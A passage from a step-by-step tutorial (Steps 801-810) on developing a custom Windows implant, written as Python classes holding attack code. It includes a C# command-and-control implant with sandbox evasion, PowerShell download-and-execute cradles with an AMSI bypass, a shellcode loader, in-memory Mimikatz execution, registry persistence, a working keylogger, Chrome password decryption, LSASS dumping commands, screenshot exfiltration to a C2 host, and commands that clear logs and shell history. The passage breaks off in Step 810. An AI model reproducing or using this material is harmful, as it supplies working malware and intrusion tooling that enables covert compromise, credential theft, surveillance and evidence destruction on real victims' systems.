# Part 81: Custom Implant Development (Steps 801-810)

## Step 801: Implant Architecture Design

ออกแบบโครงสร้าง implant ที่เหมาะสมกับการใช้งานจริง

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import struct
import os

@dataclass
class ImplantArchitecture:
    """Custom implant design principles"""
    
    def core_components(self) -> Dict:
        return {
            "components": [
                {
                    "name": "Core Engine",
                    "responsibilities": [
                        "Tasking loop (check-in, receive tasks)",
                        "Task dispatcher",
                        "Result collection"
                    ]
                },
                {
                    "name": "Transport Layer",
                    "responsibilities": [
                        "Protocol abstraction (HTTP/S, DNS, SMB)",
                        "Traffic obfuscation",
                        "Retry/failover logic"
                    ]
                },
                {
                    "name": "Crypto Module",
                    "responsibilities": [
                        "Channel encryption (AES-256-GCM)",
                        "Key exchange (ECDH)",
                        "Payload decryption"
                    ]
                },
                {
                    "name": "Capability Modules",
                    "responsibilities": [
                        "Shell execution",
                        "File operations",
                        "Screenshot/keylog",
                        "Lateral movement"
                    ]
                },
                {
                    "name": "Evasion Layer",
                    "responsibilities": [
                        "Sleep/jitter",
                        "Environment checks",
                        "Anti-analysis"
                    ]
                }
            ]
        }
    
    def design_principles(self) -> List[str]:
        return [
            "Modular: load capabilities on-demand to minimize footprint",
            "Resilient: multiple C2 channels, automatic failover",
            "Stealthy: minimal syscalls, avoid suspicious patterns",
            "Configurable: profile baked into implant at build time",
            "Self-destructing: cleanup on detection or timer",
            "Encrypted: all config and C2 traffic encrypted"
        ]
    
    def implant_config_structure(self) -> Dict:
        """Configuration baked into implant at compile time"""
        return {
            "c2_servers": [
                {"protocol": "https", "host": "redirector1.example.com", "port": 443},
                {"protocol": "dns", "domain": "c2.attacker.com", "port": 53}
            ],
            "sleep_time_ms": 60000,
            "jitter_pct": 30,
            "kill_date": "2024-12-31",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "proxy_aware": True,
            "sandbox_checks": True,
            "encryption_key": "<32_byte_aes_key_baked_in>",
            "implant_id": "<unique_per_target>"
        }


@dataclass
class CSharpImplant:
    """C# implant skeleton for Windows"""
    
    def generate_skeleton(self) -> str:
        return '''
// C# Implant Skeleton
using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Security.Cryptography;

namespace Implant {
    class Core {
        static readonly string C2_URL = "https://c2.example.com";
        static readonly byte[] AES_KEY = new byte[32]; // baked in at build
        static readonly int SLEEP_MS = 60000;
        static readonly int JITTER_PCT = 30;
        
        static HttpClient client = new HttpClient();
        
        static void Main(string[] args) {
            // Environment/sandbox checks
            if (IsAnalysisEnvironment()) Environment.Exit(0);
            
            // Main C2 loop
            while (true) {
                try {
                    string task = CheckIn();
                    if (task != null && task != "") {
                        string result = ExecuteTask(task);
                        SendResult(result);
                    }
                } catch { }
                
                // Sleep with jitter
                Thread.Sleep(GetJitteredSleep(SLEEP_MS, JITTER_PCT));
            }
        }
        
        static string CheckIn() {
            // GET request to C2 - response contains tasking
            var response = client.GetStringAsync(C2_URL + "/update").Result;
            return AESDecrypt(Convert.FromBase64String(response), AES_KEY);
        }
        
        static string ExecuteTask(string task) {
            // Dispatch to appropriate handler
            if (task.StartsWith("shell:"))
                return ExecuteShell(task.Substring(6));
            // ... other capabilities
            return "";
        }
        
        static bool IsAnalysisEnvironment() {
            return
                System.Diagnostics.Process.GetProcesses().Length < 50 ||
                Environment.ProcessorCount < 2 ||
                Environment.UserName.ToLower().Contains("sandbox");
        }
        
        static int GetJitteredSleep(int baseSleep, int jitterPct) {
            var rng = new Random();
            int jitter = (int)(baseSleep * jitterPct / 100.0);
            return baseSleep + rng.Next(-jitter, jitter);
        }
        
        static string AESDecrypt(byte[] ciphertext, byte[] key) {
            // AES-256-GCM decryption
            using (var aes = Aes.Create()) {
                aes.Key = key;
                aes.IV = ciphertext[0..16];
                var decryptor = aes.CreateDecryptor();
                var plain = decryptor.TransformFinalBlock(ciphertext, 16, ciphertext.Length - 16);
                return Encoding.UTF8.GetString(plain);
            }
        }
        
        static string ExecuteShell(string cmd) {
            var proc = System.Diagnostics.Process.Start(
                new System.Diagnostics.ProcessStartInfo {
                    FileName = "cmd.exe", Arguments = "/c " + cmd,
                    UseShellExecute = false, RedirectStandardOutput = true,
                    CreateNoWindow = true
                });
            return proc.StandardOutput.ReadToEnd();
        }
        
        static void SendResult(string result) {
            var content = new StringContent(
                Convert.ToBase64String(AESEncrypt(Encoding.UTF8.GetBytes(result), AES_KEY)),
                Encoding.UTF8, "application/json");
            client.PostAsync(C2_URL + "/result", content).Wait();
        }
        
        static byte[] AESEncrypt(byte[] plaintext, byte[] key) {
            using (var aes = Aes.Create()) {
                aes.Key = key;
                aes.GenerateIV();
                var encryptor = aes.CreateEncryptor();
                var cipher = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);
                var result = new byte[16 + cipher.Length];
                Buffer.BlockCopy(aes.IV, 0, result, 0, 16);
                Buffer.BlockCopy(cipher, 0, result, 16, cipher.Length);
                return result;
            }
        }
    }
}
'''


if __name__ == '__main__':
    arch = ImplantArchitecture()
    print("Implant components:")
    for comp in arch.core_components()['components']:
        print(f"  {comp['name']}: {comp['responsibilities'][0]}")
    
    print("\nDesign principles:")
    for principle in arch.design_principles()[:4]:
        print(f"  - {principle}")
```

## Step 802: Protocol Design for C2 Communication

ออกแบบ protocol สำหรับการสื่อสาร C2 ที่หลีกเลี่ยงการตรวจจับ

```python
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
import json
import base64
import hashlib
import hmac
import os
import time

@dataclass
class C2Protocol:
    """Custom C2 communication protocol"""
    
    MAGIC_BYTES = b'\x42\x45\x45\x46'  # Custom header
    VERSION = 1
    
    def packet_format(self) -> Dict:
        return {
            "header": {
                "magic": "4 bytes - protocol identifier",
                "version": "1 byte - protocol version",
                "msg_type": "1 byte - CHECK_IN=1, TASK=2, RESULT=3, HEARTBEAT=4",
                "implant_id": "16 bytes - unique implant identifier",
                "timestamp": "8 bytes - Unix timestamp",
                "length": "4 bytes - payload length",
                "hmac": "32 bytes - HMAC-SHA256 of header+payload"
            },
            "payload": "Encrypted (AES-256-GCM) JSON data"
        }
    
    def build_packet(self, msg_type: int, payload: dict, 
                     implant_id: bytes, key: bytes) -> bytes:
        """Build encrypted C2 packet"""
        payload_json = json.dumps(payload).encode()
        
        # Encrypt payload
        iv = os.urandom(12)
        encrypted = self._aes_gcm_encrypt(payload_json, key, iv)
        
        # Build header (without HMAC)
        timestamp = int(time.time()).to_bytes(8, 'big')
        header = (
            self.MAGIC_BYTES +
            bytes([self.VERSION, msg_type]) +
            implant_id +
            timestamp +
            len(encrypted).to_bytes(4, 'big')
        )
        
        # Compute HMAC
        mac = hmac.new(key, header + encrypted, hashlib.sha256).digest()
        
        return header + mac + encrypted
    
    def _aes_gcm_encrypt(self, plaintext: bytes, key: bytes, iv: bytes) -> bytes:
        """AES-256-GCM encryption (requires pycryptodome)"""
        try:
            from Crypto.Cipher import AES
            cipher = AES.new(key[:32], AES.MODE_GCM, nonce=iv)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return iv + tag + ciphertext
        except ImportError:
            # Fallback to XOR for demo
            return iv + bytes(a ^ b for a, b in zip(plaintext, key * (len(plaintext)//len(key)+1)))
    
    def http_masquerading(self) -> Dict:
        return {
            "check_in": {
                "method": "GET",
                "uri": "/api/v1/updates?client_id={implant_id_b64}&ts={timestamp}",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Accept": "application/json",
                    "Cache-Control": "no-cache"
                },
                "task_location": "JSON response body, 'data' field"
            },
            "result": {
                "method": "POST",
                "uri": "/api/v1/telemetry",
                "content_type": "application/json",
                "body_format": "{\"session_id\": \"<id>\", \"data\": \"<b64_encrypted>\"}"
            }
        }
    
    def encoding_techniques(self) -> Dict:
        sample_data = b'{"task": "whoami"}'
        return {
            "base64_standard": base64.b64encode(sample_data).decode(),
            "base64_url_safe": base64.urlsafe_b64encode(sample_data).decode(),
            "hex": sample_data.hex(),
            "custom_alphabet": "Substitute base64 alphabet for custom one",
            "steganography": "Embed in PNG/JPEG pixel data"
        }


@dataclass
class TaskingProtocol:
    """Implant tasking message formats"""
    
    TASK_TYPES = {
        0x01: "shell",
        0x02: "upload",
        0x03: "download",
        0x04: "inject",
        0x05: "load_module",
        0x06: "sleep",
        0x07: "self_destruct"
    }
    
    def create_task(self, task_type: int, args: dict) -> dict:
        return {
            "task_id": os.urandom(8).hex(),
            "type": self.TASK_TYPES.get(task_type, "unknown"),
            "args": args,
            "issued_at": int(time.time())
        }


if __name__ == '__main__':
    proto = C2Protocol()
    print("Packet format:")
    for field_name, desc in proto.packet_format()['header'].items():
        print(f"  {field_name}: {desc}")
    
    # Build sample packet
    implant_id = os.urandom(16)
    key = os.urandom(32)
    packet = proto.build_packet(1, {"status": "alive"}, implant_id, key)
    print(f"\nSample packet size: {len(packet)} bytes")
    
    masq = proto.http_masquerading()
    print(f"Check-in URI: {masq['check_in']['uri'][:40]}...")
```

## Step 803: Stager and Payload Delivery

การสร้าง stager ขนาดเล็กที่ดาวน์โหลด stage 2 payload

```python
from dataclasses import dataclass, field
from typing import Dict, List
import base64
import zlib

@dataclass
class StagerDesign:
    """Multi-stage payload delivery"""
    
    def stager_types(self) -> Dict:
        return {
            "stage0_mshta": {
                "description": "HTA file delivered via email/web",
                "size": "< 1KB",
                "code": '<script language="VBScript">Set o=CreateObject("WScript.Shell"):o.Run "powershell -enc <b64_stage1>",0</script>'
            },
            "stage0_macro": {
                "description": "Office macro",
                "size": "< 5KB",
                "downloads": "Stage 1 shellcode/PE"
            },
            "stage1_powershell": {
                "description": "PowerShell download cradle",
                "code": "IEX (New-Object Net.WebClient).DownloadString('https://c2/s2')",
                "purpose": "Download and execute Stage 2 in memory"
            },
            "stage2_reflective_dll": {
                "description": "Full implant as reflective DLL",
                "size": "100KB - 2MB",
                "execution": "ReflectiveDLLInjection into host process"
            }
        }
    
    def powershell_cradles(self) -> List[str]:
        return [
            # Classic
            "IEX (New-Object Net.WebClient).DownloadString('http://c2/payload')",
            # Proxy-aware
            "$w=New-Object Net.WebClient;$w.Proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.DownloadString('http://c2/p')",
            # COM object
            "IEX (New-Object -ComObject Msxml2.XMLHTTP).Open('GET','http://c2/p',$false);$x.send();$x.responseText",
            # BitsTransfer
            "Start-BitsTransfer -Source http://c2/p -Destination $env:TEMP\\p.ps1; IEX (gc $env:TEMP\\p.ps1)",
            # Bypass AMSI + download
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (iwr http://c2/p -UseBasicParsing)"
        ]
    
    def compressed_shellcode_loader(self, shellcode: bytes) -> str:
        """Generate compressed PowerShell shellcode loader"""
        compressed = zlib.compress(shellcode, 9)
        b64 = base64.b64encode(compressed).decode()
        
        loader = f'''
$compressed = [Convert]::FromBase64String("{b64}")
$ms = New-Object IO.MemoryStream(,$compressed)
$ds = New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($ds)
$shellcode = [Text.Encoding]::UTF8.GetBytes($sr.ReadToEnd())

# Allocate and execute
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)
$delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Action])
$delegate.Invoke()
'''
        return loader


if __name__ == '__main__':
    stager = StagerDesign()
    print("Stager types:")
    for name, info in stager.stager_types().items():
        print(f"  {name}: {info['description']}")
    
    print("\nPowerShell cradles (count):", len(stager.powershell_cradles()))
    print("Classic cradle:", stager.powershell_cradles()[0][:60] + "...")
    
    sample_sc = b'\x90' * 20  # NOP sled for demo
    loader = stager.compressed_shellcode_loader(sample_sc)
    print(f"\nGenerated loader: {len(loader)} chars")
```

## Step 804: In-Memory Execution Techniques

เทคนิครัน code ในหน่วยความจำโดยไม่สร้างไฟล์

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class InMemoryExecution:
    """Execute payloads entirely in memory"""
    
    def reflective_dll_injection(self) -> Dict:
        return {
            "technique": "Reflective DLL Injection",
            "description": "DLL that loads itself without LoadLibrary",
            "how_it_works": [
                "DLL contains its own loader (ReflectiveLoader export)",
                "Shellcode calls ReflectiveLoader",
                "ReflectiveLoader parses its own PE headers",
                "Maps sections, resolves imports, applies relocations",
                "Calls DllMain - DLL is now loaded without touching disk"
            ],
            "advantage": "No disk artifact, bypasses DLL load monitoring via filesystem",
            "tools": ["ReflectiveDLLInjection (GitHub)", "donut (shellcode from DLL)", "sRDI"]
        }
    
    def donut_shellcode(self) -> Dict:
        return {
            "tool": "donut (TheWover)",
            "purpose": "Convert .NET/PE/DLL to position-independent shellcode",
            "commands": [
                "# Convert .NET assembly to shellcode",
                "donut -f assembly.exe -o shellcode.bin",
                "",
                "# With AMSI/WLDP bypass",
                "donut -f assembly.exe -b 3 -o shellcode.bin",
                "",
                "# Compress and encrypt",
                "donut -f payload.exe -z 2 -e 3 -o shellcode.bin"
            ],
            "output": "shellcode.bin - inject with any shellcode loader"
        }
    
    def assembly_execution_csharp(self) -> str:
        return '''
// Execute .NET assembly in memory from bytes
using System;
using System.Reflection;

class InMemoryAssemblyRunner {
    static void RunAssembly(byte[] assemblyBytes, string[] args) {
        // Load assembly from byte array (no disk write)
        Assembly asm = Assembly.Load(assemblyBytes);
        
        // Find entry point
        MethodInfo entryPoint = asm.EntryPoint;
        
        // Execute
        object[] parameters = new object[] { args };
        entryPoint.Invoke(null, parameters);
    }
    
    // Example: download and run Mimikatz in memory
    static void RunMimikatzInMemory() {
        using var client = new System.Net.WebClient();
        byte[] mimikatzBytes = client.DownloadData("https://c2/mimikatz.exe");
        RunAssembly(mimikatzBytes, new[] { "sekurlsa::logonpasswords", "exit" });
    }
}
'''
    
    def pe_to_shellcode_techniques(self) -> List[str]:
        return [
            "donut - most popular, supports .NET/unmanaged",
            "pe2sh - simple PE to shellcode",
            "pe_to_shellcode - x86/x64 PE loader stub",
            "Manual implementation: parse PE, map sections, fix imports, jump to EP"
        ]


if __name__ == '__main__':
    mem = InMemoryExecution()
    print("Reflective DLL steps:")
    for step in mem.reflective_dll_injection()['how_it_works']:
        print(f"  {step}")
    
    print("\nDonut commands:")
    for cmd in mem.donut_shellcode()['commands']:
        print(f"  {cmd}")
```

## Step 805: Implant Persistence and Upgrade

การเพิ่ม persistence ให้ implant และการ upgrade payload

```python
from dataclasses import dataclass
from typing import Dict, List
import base64

@dataclass
class ImplantPersistence:
    """Implant persistence and upgrade mechanisms"""
    
    def auto_upgrade(self) -> Dict:
        return {
            "mechanism": "Implant self-update",
            "flow": [
                "C2 sends 'upgrade' task with new payload bytes",
                "Implant writes new version to disk (randomized name)",
                "Adds new version to persistence location",
                "Executes new version",
                "Old version cleans up and exits"
            ],
            "powershell_update": '''
# Receive new payload from C2
$newPayload = [Convert]::FromBase64String($task.payload)
$newPath = "$env:APPDATA\\" + [System.IO.Path]::GetRandomFileName() + ".exe"
[IO.File]::WriteAllBytes($newPath, $newPayload)

# Add to Run key
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value $newPath

# Start new implant
Start-Process $newPath -WindowStyle Hidden

# Cleanup old persistence
Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "OldName" -ErrorAction SilentlyContinue

# Exit old implant
[System.Environment]::Exit(0)
'''
        }
    
    def redundant_persistence(self) -> List[Dict]:
        return [
            {
                "method": "Primary: Scheduled Task (SYSTEM)",
                "trigger": "Every 4 hours",
                "fallback_to": "Secondary if not detected"
            },
            {
                "method": "Secondary: Registry Run Key",
                "trigger": "On user login",
                "fallback_to": "Tertiary if removed"
            },
            {
                "method": "Tertiary: WMI Subscription",
                "trigger": "System time event",
                "stealth": "Hardest to detect/remove"
            },
            {
                "method": "Beacon-less: Golden Ticket",
                "trigger": "On-demand TGT request",
                "no_file": "Requires re-compromise for ops"
            }
        ]
    
    def kill_switch(self) -> Dict:
        return {
            "triggers": [
                "Kill date reached (baked in at build)",
                "Kill command from C2",
                "Specific file/mutex present on system",
                "Detection artifact found (sandbox indicator)"
            ],
            "actions": [
                "Remove all persistence mechanisms",
                "Zero-out memory buffers (keys, config)",
                "Delete implant file (self-delete)",
                "Overwrite with random data before delete"
            ],
            "self_delete_trick": '''
// Windows self-delete trick
void SelfDelete() {
    wchar_t szModule[MAX_PATH];
    GetModuleFileName(NULL, szModule, MAX_PATH);
    
    // Open handle with DELETE access
    HANDLE hFile = CreateFile(szModule, DELETE, 0, NULL, OPEN_EXISTING,
                              FILE_FLAG_DELETE_ON_CLOSE, NULL);
    // Rename to hidden file
    // ... rename stream trick ...
    CloseHandle(hFile); // Deletion queued
    ExitProcess(0);
}
'''
        }


if __name__ == '__main__':
    persist = ImplantPersistence()
    print("Auto-upgrade flow:")
    for step in persist.auto_upgrade()['flow']:
        print(f"  {step}")
    
    print("\nRedundant persistence:")
    for method in persist.redundant_persistence():
        print(f"  {method['method']}: {method['trigger']}")
    
    print("\nKill switch triggers:")
    for trigger in persist.kill_switch()['triggers']:
        print(f"  - {trigger}")
```

## Step 806: Capability Modules - Keylogger & Screenshot

สร้าง module สำหรับการเก็บข้อมูลผู้ใช้

```python
from dataclasses import dataclass
from typing import Dict, List, Optional
import base64
import datetime

@dataclass
class KeyloggerModule:
    """Keylogger capability module"""
    
    def windows_hook_keylogger(self) -> str:
        return '''
// Windows SetWindowsHookEx keylogger
#include <windows.h>
#include <fstream>

HHOOK g_hook = NULL;
std::ofstream g_logfile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        
        // Get window title for context
        HWND hwnd = GetForegroundWindow();
        char title[256] = {};
        GetWindowTextA(hwnd, title, sizeof(title));
        
        // Map virtual key to char
        BYTE keyState[256];
        GetKeyboardState(keyState);
        char buffer[5] = {};
        int result = ToAscii(p->vkCode, p->scanCode, keyState, (LPWORD)buffer, 0);
        
        if (result == 1) {
            g_logfile << buffer;
        } else {
            // Special keys
            switch(p->vkCode) {
                case VK_RETURN: g_logfile << "[ENTER]\n"; break;
                case VK_BACK:   g_logfile << "[BS]"; break;
                case VK_TAB:    g_logfile << "[TAB]"; break;
            }
        }
        g_logfile.flush();
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void StartKeylogger() {
    g_logfile.open("C:\\ProgramData\\log.dat", std::ios::app);
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { // Message loop required
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
'''
    
    def keylogger_detection_evasion(self) -> Dict:
        return {
            "encrypt_log": "XOR/AES encrypt keylog buffer before writing",
            "memory_only": "Keep keylog in memory, send via C2, never write to disk",
            "hide_hook": "Use kernel driver instead of SetWindowsHookEx (EDR-visible)",
            "passive_api": "GetAsyncKeyState polling instead of hook (slower but more stealthy)"
        }


@dataclass
class ScreenshotModule:
    """Screenshot capture module"""
    
    def screenshot_methods(self) -> Dict:
        return {
            "win32_gdi": {
                "api": "BitBlt + CreateCompatibleBitmap",
                "captures": "Full desktop screenshot"
            },
            "directx": {
                "api": "IDXGIOutputDuplication (Desktop Duplication API)",
                "advantage": "Captures hardware-accelerated content too"
            },
            "per_window": {
                "api": "PrintWindow for specific HWND",
                "use": "Capture specific application window"
            }
        }
    
    def powershell_screenshot(self) -> str:
        return '''
# PowerShell screenshot
[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

# Save to memory stream
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$b64 = [Convert]::ToBase64String($ms.ToArray())

# Send to C2
$wc = New-Object Net.WebClient
$wc.Headers["Content-Type"] = "application/json"
$wc.UploadString("https://c2/screenshot", "{`"data`":`"$b64`"}")
'''


if __name__ == '__main__':
    kl = KeyloggerModule()
    print("Keylogger evasion:")
    for method, desc in kl.keylogger_detection_evasion().items():
        print(f"  {method}: {desc}")
    
    ss = ScreenshotModule()
    print("\nScreenshot methods:")
    for method, info in ss.screenshot_methods().items():
        print(f"  {method}: {info['captures' if 'captures' in info else 'advantage']}")
```

## Step 807: Credential Harvesting Module

โมดูลเก็บ credentials จากหลายแหล่ง

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class CredentialHarvester:
    """Credential harvesting from various sources"""
    
    def browser_credentials(self) -> Dict:
        return {
            "chrome": {
                "db_path": "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
                "encryption": "DPAPI (CryptUnprotectData) or AES-256-GCM (Chrome 80+)",
                "method": """
# Chrome credential extraction
import sqlite3
import win32crypt  # pywin32
import json
import base64
from Crypto.Cipher import AES

def get_chrome_encryption_key():
    local_state_path = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State")
    with open(local_state_path, 'r') as f:
        local_state = json.loads(f.read())
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Skip DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(ciphertext: bytes, key: bytes) -> str:
    iv = ciphertext[3:15]
    payload = ciphertext[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode()
"""
            },
            "firefox": {
                "db_path": "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json",
                "tool": "firepwd.py - decrypt NSS/PK11 encrypted passwords",
                "note": "Requires master password if set"
            },
            "credential_manager": {
                "tool": "cmdkey /list - list stored credentials",
                "extraction": "Mimikatz vault::cred"
            }
        }
    
    def lsass_techniques(self) -> List[Dict]:
        return [
            {
                "name": "Mimikatz sekurlsa",
                "command": "sekurlsa::logonpasswords",
                "requirement": "Debug privilege or SYSTEM",
                "detection_risk": "HIGH"
            },
            {
                "name": "LSASS dump + offline parse",
                "command": "procdump -ma lsass.exe lsass.dmp  # then parse offline",
                "detection_risk": "MEDIUM - dump triggers alert"
            },
            {
                "name": "Nanodump",
                "command": "nanodump.exe --write /tmp/lsass.dmp",
                "detection_risk": "LOW - uses direct syscalls, creates minidump"
            },
            {
                "name": "PPLdump",
                "command": "PPLdump.exe lsass.exe lsass.dmp",
                "purpose": "Bypass LSA Protected Process"
            },
            {
                "name": "Task Manager",
                "command": "Right click lsass.exe -> Create dump file",
                "detection_risk": "HIGH but no code needed"
            }
        ]
    
    def password_stores(self) -> Dict:
        return {
            "windows": [
                "%APPDATA%\\..\\Local\\Microsoft\\Credentials\\ (Credential Manager)",
                "C:\\Windows\\System32\\config\\SAM (local hashes - needs SYSTEM)",
                "%APPDATA%\\..\\Local\\Packages\\*\\AC\\Microsoft\\Credentials\\",
                "Registry: HKLM\\SAM, HKLM\\SECURITY"
            ],
            "linux": [
                "/etc/shadow (hashed passwords - needs root)",
                "~/.ssh/id_rsa (private keys)",
                "~/.bash_history (commands with passwords)",
                "/var/lib/mysql/mysql/ (database credentials)",
                "Config files: /etc/*/config, *.conf, *.ini with password fields"
            ]
        }


if __name__ == '__main__':
    harvester = CredentialHarvester()
    print("LSASS techniques:")
    for tech in harvester.lsass_techniques():
        print(f"  [{tech['detection_risk']}] {tech['name']}")
    
    print("\nPassword stores (Windows):")
    for store in harvester.password_stores()['windows']:
        print(f"  {store}")
```

## Step 808: Network Reconnaissance Module

โมดูล recon เครือข่ายภายใน environment

```python
from dataclasses import dataclass
from typing import Dict, List, Optional
import socket
import struct
import ipaddress

@dataclass
class NetworkReconModule:
    """Internal network reconnaissance"""
    
    def host_discovery(self, subnet: str = "192.168.1.0/24") -> Dict:
        return {
            "ping_sweep": f"for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo 192.168.1.$i; done",
            "arp_scan": "arp -a  # Check ARP cache for local subnet",
            "nmap_ping": f"nmap -sn {subnet}",
            "internal_only": "Try to avoid noisy network scans - use ARP/passive methods"
        }
    
    def port_scan_techniques(self) -> Dict:
        return {
            "tcp_connect": "Full TCP handshake - reliable but detectable",
            "syn_scan": "Half-open scan - requires raw socket (root)",
            "python_scanner": '''
import socket
import concurrent.futures

def scan_port(host: str, port: int, timeout: float = 0.5) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def port_scan(host: str, ports: list) -> list:
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                open_ports.append(futures[future])
    return sorted(open_ports)

# Scan common ports
common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
                993, 995, 1433, 3306, 3389, 5985, 8080, 8443]
open = port_scan("192.168.1.10", common_ports)
print(f"Open ports: {open}")
'''
        }
    
    def service_enumeration(self) -> Dict:
        return {
            "smb": [
                "nmap -p 445 --script smb-enum-shares,smb-enum-users <target>",
                "smbclient -L //target -N  # List shares",
                "crackmapexec smb <subnet>/24 -u '' -p ''  # Null session enum"
            ],
            "ldap": [
                "nmap -p 389 --script ldap-search <DC>",
                "ldapsearch -x -H ldap://DC -b 'DC=domain,DC=com' '(objectClass=user)'"
            ],
            "rdp": ["nmap -p 3389 --script rdp-enum-encryption <target>"],
            "mssql": [
                "nmap -p 1433 --script ms-sql-info,ms-sql-empty-password <target>",
                "sqsh -S target -U sa -P ''  # Default SA empty password"
            ]
        }


if __name__ == '__main__':
    recon = NetworkReconModule()
    print("Host discovery:")
    for method, cmd in recon.host_discovery().items():
        print(f"  {method}: {cmd[:60] if len(cmd) > 60 else cmd}")
    
    print("\nSMB enumeration:")
    for cmd in recon.service_enumeration()['smb']:
        print(f"  {cmd}")
```

## Step 809: Anti-Analysis and Counter-Forensics

เทคนิคต่อต้านการวิเคราะห์และสึบหาร่องรอยดิจิตอล

```python
from dataclasses import dataclass
from typing import Dict, List
import subprocess

@dataclass
class AntiForensics:
    """Counter-forensics and anti-analysis techniques"""
    
    def log_clearing(self) -> Dict:
        return {
            "windows_event_logs": [
                "# Clear all Windows event logs",
                'wevtutil el | ForEach-Object {wevtutil cl "$_"}',
                "",
                "# PowerShell",
                "Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }",
                "",
                "# Clear specific logs",
                "wevtutil cl Security",
                "wevtutil cl System",
                "wevtutil cl Application",
                "wevtutil cl 'Microsoft-Windows-Sysmon/Operational'"
            ],
            "linux_logs": [
                "# Clear bash history",
                "history -c && history -w",
                "echo '' > ~/.bash_history",
                "unset HISTFILE",
                "",
                "# Clear system logs",
                "truncate -s 0 /var/log/auth.log",
                "truncate -s 0 /var/log/syslog",
                "> /var/log/wtmp  # Clear login history",
                "> /var/log/lastlog"
            ]
        }
    
    def timestomping(self) -> Dict:
        return {
            "concept": "Modify file timestamps to confuse forensic timeline",
            "windows_cmd": """
# PowerShell timestomping
$file = Get-Item 'C:\\malware.exe'
$legitDate = (Get-Item 'C:\\Windows\\notepad.exe').LastWriteTime
$file.LastWriteTime = $legitDate
$file.LastAccessTime = $legitDate
$file.CreationTime = $legitDate
""",
            "linux_cmd": "touch -t 202001010000 malware_file  # Set to 2020-01-01 00:00",
            "limitation": "$STANDARD_INFORMATION and $FILE_NAME in NTFS MFT - forensics can detect mismatch"
        }
    
    def secure_file_deletion(self) -> Dict:
        return {
            "windows": [
                "sdelete.exe -p 3 malware.exe  # Sysinternals - 3 overwrites",
                "cipher /w:C:\\path\\  # Overwrite free space"
            ],
            "linux": [
                "shred -vzun 5 malware  # 5 overwrites + delete",
                "wipe -rf malware_dir/",
                "dd if=/dev/urandom of=malware bs=1 count=$(stat -c%s malware)"
            ],
            "limitation": "SSD trim, filesystem journal, shadow copies may retain data"
        }
    
    def memory_artifact_cleanup(self) -> List[str]:
        return [
            "Zero-out sensitive buffers before freeing (memset to 0)",
            "Clear process command line in PEB after startup",
            "Unload injected DLLs from target process",
            "Remove module from PEB LDR linked list",
            "Clear stack frames with sensitive data"
        ]


if __name__ == '__main__':
    af = AntiForensics()
    print("Windows log clearing:")
    for cmd in af.log_clearing()['windows_event_logs'][:5]:
        print(f"  {cmd}")
    
    print("\nMemory artifact cleanup:")
    for step in af.memory_artifact_cleanup():
        print(f"  - {step}")
```

## Step 810: Implant Testing and Quality Assurance

การทดสอบ implant ກ่อนใช้งานจริง

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class ImplantTesting:
    """Testing methodology for custom implants"""
    
    def av_testing_checklist(self) -> Dict:
        return {
            "static_analysis": [
                "Upload to VirusTotal (CAUTION: shares with AV vendors - use private scan or Never upload ops implants)",
                "Better: antiscan.me (private scanning)",
                "Better: install AV locally and scan offline",
